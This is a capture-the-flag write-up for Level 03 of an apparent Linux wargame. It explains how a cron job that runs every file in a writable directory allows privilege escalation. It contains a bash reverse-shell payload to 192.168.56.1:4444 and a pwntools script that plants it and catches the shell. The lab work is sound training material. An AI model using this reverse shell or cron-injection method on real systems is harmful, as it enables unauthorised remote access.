# Level 03

## Discription

>Check the home directory of flag03 and take note of the files there. \
\
>There is a crontab that is called every couple of minutes. \
\
>To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.

## Solution

As specified in challenge description `here is a crontab that is called every couple of minutes`, it's very clear that we have to find something suspicious that [crontab](https://www.geeksforgeeks.org/crontab-in-linux-with-examples/) might be running in every couple of minutes.

So looking into flag00 home directory, we got a file named writable.sh with content -  

```bash
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

So here it is, this file is perfect for cronjob as the code is very vulnerable and we can use it for privilege escalation.

The code is very simple, It is looping through the files of  /home/flag03/writable.d/ directory.

````bash
for i in /home/flag03/writable.d/* ; do
````

then setting maximum [CPU time](https://en.wikipedia.org/wiki/CPU_time) to 5 seconds and executing the file in [debug mode](https://www.thegeekdiary.com/how-to-debug-shell-scripts/).

````bash
(ulimit -t 5; bash -x "$i")
````

And at last deleting the file.

```bash
rm -f "$i"
```

We have write permission in writable.d directory. Let's write a file containing reverse shell inside writable.d directory and `bash -x "$i"` will execute our file.

![](Images/remote.png)

![](Images/local.png)

## Python



```python
#!/usr/bin/python3

from pwn import *
from sys import argv,exit
from time import sleep

if len(argv) < 2:
	sys.exit("Target IP Missing") 

level03 = ssh(host=argv[1],user='level03',password='level03')

remote_pro = level03.process('bash')
remote_pro.sendline('echo "bash -i >& /dev/tcp/192.168.56.1/4444 0>&1" > /home/flag03/writable.d/exploit.sh')
remote_pro.sendline('chmod +x /home/flag03/writable.d/exploit.sh')
local_pro = process(['nc','-nvlp','4444'])
log.info('Hold 3 Minutes For Reverse Connection...')
sleep(180)
local_pro.sendline('getflag')
local_pro.interactive()
```

